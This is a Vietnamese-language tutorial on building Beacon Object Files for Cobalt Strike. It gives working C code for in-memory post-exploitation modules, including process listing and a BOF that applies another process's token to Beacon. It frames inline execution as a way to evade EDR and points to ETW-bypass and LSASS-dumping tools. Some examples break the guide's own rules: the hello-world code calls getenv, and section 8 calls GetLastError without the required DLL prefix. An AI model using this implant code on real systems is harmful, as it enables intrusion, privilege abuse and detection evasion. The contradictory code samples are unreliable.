# Cobalt Strike — Hướng Dẫn Phát Triển BOF (Tiếng Việt)

> Beacon Object Files (BOF) là các file object C đã biên dịch được thực thi inline trong tiến trình Beacon. Không có tiến trình mới nào được tạo, không có file nào rơi xuống đĩa, và BOF chia sẻ không gian bộ nhớ của Beacon. Hướng dẫn này bao gồm viết, biên dịch và sử dụng BOF.

---

## Mục Lục

1. [BOF Là Gì?](#1-bof-là-gì)
2. [Kiến Trúc BOF](#2-kiến-trúc-bof)
3. [Thiết Lập Môi Trường Phát Triển](#3-thiết-lập-môi-trường-phát-triển)
4. [Tham Khảo API BOF](#4-tham-khảo-api-bof)
5. [Viết BOF Đầu Tiên](#5-viết-bof-đầu-tiên)
6. [Gọi Windows API từ BOF](#6-gọi-windows-api-từ-bof)
7. [Tham Số Đầu Vào (BeaconDataParser)](#7-tham-số-đầu-vào-beacondataparser)
8. [Xuất Output (BeaconPrintf / BeaconOutput)](#8-xuất-output-beaconprintf--beaconoutput)
9. [Sử Dụng Hàm COFF và DLL được Import](#9-sử-dụng-hàm-coff-và-dll-được-import)
10. [Xử Lý Lỗi](#10-xử-lý-lỗi)
11. [Ví Dụ BOF Hoàn Chỉnh](#11-ví-dụ-bof-hoàn-chỉnh)
12. [Biên Dịch BOF](#12-biên-dịch-bof)
13. [Tải BOF vào Cobalt Strike](#13-tải-bof-vào-cobalt-strike)
14. [Pattern BOF Nâng Cao](#14-pattern-bof-nâng-cao)
15. [Bộ Sưu Tập & Tài Nguyên BOF](#15-bộ-sưu-tập--tài-nguyên-bof)

---

## 1. BOF Là Gì?

BOF là **file object định dạng COFF (Common Object File Format)** — kết quả biên dịch trung gian của file nguồn C, trước khi linking. Beacon tải nó trực tiếp vào bộ nhớ của chính nó, giải quyết symbol, và thực thi.

### BOF vs. execute-assembly vs. shell

| Phương thức | Tạo tiến trình? | File trên đĩa? | Rủi ro crash |
|---|---|---|---|
| `shell` | Có (cmd.exe) | Không | Không (Beacon không bị ảnh hưởng) |
| `powershell` | Có (powershell.exe) | Không | Không |
| `execute-assembly` | Có (spawnto) | Không | Không (sacrificial) |
| `inline-execute` (BOF) | **Không** | **Không** | **Có — crash Beacon** |

BOF thân thiện OPSEC nhất nhưng có rủi ro cao nhất. BOF crash sẽ kết thúc phiên Beacon.

### Khi Nào Dùng BOF

- Khi cần **không tạo tiến trình** — tương quan parent-child process của EDR là tín hiệu mạnh
- Cho các thao tác nhanh, đơn giản (liệt kê tiến trình, truy vấn registry, thao tác token)
- Khi đã kiểm tra BOF và chắc chắn nó sẽ không crash
- Cho các thao tác có sẵn trong bộ sưu tập BOF cộng đồng đáng tin cậy

---

## 2. Kiến Trúc BOF

### Luồng Thực Thi

```
1. Operator chạy: beacon> inline-execute /path/to/bof.o [tham_số]
2. Cobalt Strike đọc file .o
3. Aggressor Script đóng gói tham số vào buffer nhị phân
4. Beacon nhận nhiệm vụ chứa: byte BOF + buffer tham số
5. Beacon tải COFF vào bộ nhớ tiến trình của nó
6. Beacon giải quyết symbol bên ngoài (Win32 API qua dynamic resolution)
7. Beacon gọi entry point của BOF (go())
8. BOF thực thi — output qua BeaconPrintf đến operator
9. BOF trả về — Beacon giải phóng bộ nhớ COFF
```

### Ràng Buộc Chính

- **Không có CRT** — không thể gọi `malloc`, `free`, `printf`, `sprintf`, v.v. trực tiếp
- **Không có biến static/global** (code vị trí độc lập)
- **Phải dùng BeaconDataParser** cho tham số đầu vào
- **Phải dùng BeaconPrintf/BeaconOutput** cho output
- **Phải resolve Win32 API động** sử dụng pattern `KERNEL32$GetProcAddress`
- **Entry point phải tên là** `go`
- **Vị trí độc lập** — không có địa chỉ tuyệt đối

---

## 3. Thiết Lập Môi Trường Phát Triển

### Công Cụ Cần Thiết

```bash
# Lựa chọn 1: MinGW (cross-compile trên Linux/macOS)
sudo apt install mingw-w64

# Lựa chọn 2: Visual Studio (Windows — cl.exe)
# Cài VS Build Tools

# Lựa chọn 3: Zig (đa nền tảng, hỗ trợ cross-compile tuyệt vời)
sudo apt install zig

# Tùy chọn: bộ công cụ BOF Development
git clone https://github.com/trustedsec/COFFLoader    # kiểm tra local
git clone https://github.com/Cobalt-Strike/bof_template  # template chính thức
```

### Cấu Trúc Thư Mục

```
mybof/
├── src/
│   └── mybof.c           # source BOF
├── include/
│   └── beacon.h          # header API Beacon (từ Cobalt Strike)
│   └── bofdefs.h         # định nghĩa type Windows API
├── Makefile
└── mybof.cna             # Aggressor Script để tải BOF
```

---

## 4. Tham Khảo API BOF

### Loại Output

```c
#define CALLBACK_OUTPUT      0x0   // output thông thường (chữ trắng)
#define CALLBACK_ERROR       0x0d  // lỗi (chữ đỏ)
```

### Pattern Dynamic API Resolution

```c
// Import hàm Windows API động
// Định dạng: <DLLNAME>$<FunctionName>
// Tên DLL phải là CHỮ HOA

// Hàm kernel32.dll:
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

// ntdll.dll:
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);

// advapi32.dll:
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
```

---

## 5. Viết BOF Đầu Tiên

### Hello World BOF

```c
// hello.c
#include <windows.h>
#include "beacon.h"

void go(char * args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "Xin chào từ BOF!\n");
    BeaconPrintf(CALLBACK_OUTPUT, "Đang chạy với tư cách: %s\\%s\n",
        getenv("USERDOMAIN"), getenv("USERNAME"));
}
```

Biên dịch:
```bash
x86_64-w64-mingw32-gcc -o hello.o -c hello.c
```

Chạy trong Beacon:
```
beacon> inline-execute hello.o
```

---

## 6. Gọi Windows API từ BOF

### Pattern Import

Mỗi lời gọi Windows API trong BOF phải dùng pattern `DLL$FunctionName`:

```c
// Bước 1: Khai báo import ở đầu file
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);

// Bước 2: Sử dụng trong go()
void go(char * args, int alen) {
    HANDLE hFile = KERNEL32$CreateFileA(
        "C:\\Temp\\test.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
}
```

### Khai Báo Import API Phổ Biến

```c
// Kernel32
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI DWORD  WINAPI KERNEL32$GetCurrentProcessId(VOID);
WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE h);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
WINBASEAPI BOOL   WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI HANDLE WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);

// Advapi32
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$RevertToSelf(VOID);
```

---

## 7. Tham Số Đầu Vào (BeaconDataParser)

```c
void go(char * args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int    myInt    = BeaconDataInt(&parser);       // int 4 byte
    short  myShort  = BeaconDataShort(&parser);     // short 2 byte
    int    strLen;
    char * myStr    = BeaconDataExtract(&parser, &strLen);  // chuỗi
}
```

### Loại Tham Số

| Hàm | Kiểu C | Hàm Pack Aggressor |
|---|---|---|
| `BeaconDataInt` | `int` (4 byte) | `bof_pack("i", $int)` |
| `BeaconDataShort` | `short` (2 byte) | `bof_pack("s", $short)` |
| `BeaconDataExtract` | `char*` | `bof_pack("z", $str)` |
| `BeaconDataExtractWchar` | `wchar_t*` | `bof_pack("Z", $wstr)` |

### Aggressor Script — Gọi BOF Với Tham Số

```coffeescript
alias mybof {
    local('$bid $args $pid $hostname');
    $bid      = $1;
    $pid      = $2;
    $hostname = $3;

    # Pack tham số: i = int, z = chuỗi (kết thúc bằng null)
    $args = bof_pack("iz", int($pid), $hostname);

    # Thực thi BOF
    beacon_inline_execute($bid, readb(openf("/path/to/mybof.o")), "go", $args);
    btask($bid, "Đang chạy mybof");
}
```

---

## 8. Xuất Output (BeaconPrintf / BeaconOutput)

```c
// Output kiểu printf
BeaconPrintf(CALLBACK_OUTPUT, "[*] Tìm thấy %d tiến trình\n", count);
BeaconPrintf(CALLBACK_ERROR,  "[-] Lỗi: %lu\n", GetLastError());

// Output nhị phân thô (cho dữ liệu có cấu trúc)
BeaconOutput(CALLBACK_OUTPUT, buffer, buffer_len);
```

---

## 9. Sử Dụng Hàm COFF và DLL được Import

### Thao Tác Chuỗi (Không Có CRT)

```c
// Dùng prefix MSVCRT$ cho hàm C runtime
WINBASEAPI void  WINAPI MSVCRT$memset(void*, int, size_t);
WINBASEAPI void  WINAPI MSVCRT$memcpy(void*, const void*, size_t);
WINBASEAPI int   WINAPI MSVCRT$strlen(const char*);
WINBASEAPI int   WINAPI MSVCRT$strcmp(const char*, const char*);
WINBASEAPI char* WINAPI MSVCRT$strcat(char*, const char*);
```

---

## 10. Xử Lý Lỗi

```c
void go(char * args, int alen) {
    HANDLE h = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);
    if (h == NULL || h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess thất bại: %lu\n",
            KERNEL32$GetLastError());
        return;    // luôn return gọn gàng — đừng crash
    }

    // ... làm việc ...

    KERNEL32$CloseHandle(h);
}
```

**Cực kỳ quan trọng:** Không bao giờ để BOF crash. Luôn:
- Kiểm tra giá trị trả về
- Giải phóng bộ nhớ đã cấp phát trước khi return
- Return gọn gàng khi có lỗi

---

## 11. Ví Dụ BOF Hoàn Chỉnh

### BOF Liệt Kê Tiến Trình

```c
// processlist.c
#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL   WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char * args, int alen) {
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateToolhelp32Snapshot thất bại: %lu\n",
            KERNEL32$GetLastError());
        return;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    BeaconPrintf(CALLBACK_OUTPUT, "%-8s %-8s %s\n", "PID", "PPID", "Tên");
    BeaconPrintf(CALLBACK_OUTPUT, "%-8s %-8s %s\n", "---", "----", "---");

    if (KERNEL32$Process32FirstW(snap, &pe)) {
        do {
            BeaconPrintf(CALLBACK_OUTPUT, "%-8lu %-8lu %ls\n",
                pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
        } while (KERNEL32$Process32NextW(snap, &pe));
    }

    KERNEL32$CloseHandle(snap);
}
```

---

## 12. Biên Dịch BOF

### MinGW (Cross-compile trên Linux/macOS)

```makefile
CC_x64 = x86_64-w64-mingw32-gcc
CC_x86 = i686-w64-mingw32-gcc
CFLAGS = -masm=intel -Wall -o

all: processlist.x64.o processlist.x86.o

processlist.x64.o: src/processlist.c
	$(CC_x64) $(CFLAGS) $@ -c $<

processlist.x86.o: src/processlist.c
	$(CC_x86) $(CFLAGS) $@ -c $<

clean:
	rm -f *.o
```

```bash
make
# Kết quả: processlist.x64.o, processlist.x86.o
```

### Visual Studio / cl.exe (Windows)

```batch
cl.exe /c /GS- /O1 src\processlist.c /Fo:processlist.x64.o
```

### Zig (Đa Nền Tảng)

```bash
zig cc -target x86_64-windows -c src/processlist.c -o processlist.x64.o
zig cc -target x86-windows -c src/processlist.c -o processlist.x86.o
```

---

## 13. Tải BOF vào Cobalt Strike

### Phương Thức 1: inline-execute Trực Tiếp

```
beacon> inline-execute /opt/bofs/processlist.x64.o
beacon> inline-execute /opt/bofs/regquery.x64.o "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" "WindowsUpdate"
```

### Phương Thức 2: Alias Aggressor Script

```coffeescript
# regquery.cna
alias regquery {
    local('$bid $key $val $args $data');
    $bid = $1;
    $key = $2;
    $val = $3;

    if ($key eq "" || $val eq "") {
        berror($bid, "Cách dùng: regquery <key> <value>");
        return;
    }

    $args = bof_pack("zz", $key, $val);
    $data = readb(openf(script_resource("regquery.x64.o")));
    beacon_inline_execute($bid, $data, "go", $args);
    btask($bid, "Truy vấn registry: $key\\$val");
}

beacon_command_register(
    "regquery",
    "Truy vấn giá trị registry inline (không spawn reg.exe)",
    "Cách dùng: regquery <HKLM\\key\\path> <value_name>\n"
);
```

Tải script: `Cobalt Strike → Script Manager → Load → regquery.cna`

Sử dụng:
```
beacon> regquery SOFTWARE\Microsoft\Windows\CurrentVersion\Run WindowsUpdate
```

---

## 14. Pattern BOF Nâng Cao

### Thao Tác Token trong BOF

```c
// Giả mạo token từ tiến trình khác
void go(char * args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    int pid = BeaconDataInt(&parser);

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess thất bại\n");
        return;
    }

    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken thất bại\n");
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    // Dùng BeaconUseToken để đặt đây là token hiện tại của Beacon
    if (BeaconUseToken(hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Token từ PID %d đã áp dụng cho Beacon\n", pid);
    }

    KERNEL32$CloseHandle(hToken);
    KERNEL32$CloseHandle(hProcess);
}
```

---

## 15. Bộ Sưu Tập & Tài Nguyên BOF

### Bộ Sưu Tập BOF Cộng Đồng

| Repository | Nội dung |
|---|---|
| `trustedsec/CS-Situational-Awareness-BOF` | whoami, netstat, nslookup, dir, env, procdump, listmods |
| `trustedsec/CS-Remote-OPs-BOF` | WMI query, schtasks, service ops, reg ops |
| `boku7/injectEtwBypass` | BOF bypass ETW |
| `nanodump` | Dump LSASS không có handle đáng ngờ |
| `EspressoCake/inject-assembly` | Thực thi .NET in-process |
| `kyleavery/Syscalls-BOF` | Direct syscall BOF để unhook API |

### Kiểm Tra BOF Cục Bộ (Không Cần CS)

```bash
# Dùng trustedsec/COFFLoader để kiểm tra cục bộ
git clone https://github.com/trustedsec/COFFLoader
cd COFFLoader
make

# Kiểm tra BOF:
./COFFLoader64 processlist.x64.o go ""
./COFFLoader64 regquery.x64.o go pack:zz:"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run":"WindowsUpdate"
```

### Tài Nguyên Chính Thức

- Blog Cobalt Strike: [Beacon Object Files](https://www.cobaltstrike.com/blog/beacon-object-files-luser-agent-ioctls-and-targeting-the-cobalt-strike-community-kit)
- Template BOF chính thức: `Cobalt-Strike/bof_template` trên GitHub
- Header `beacon.h`: trong gói phân phối CS tại `cobaltstrike/scripts/bof/beacon.h`

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
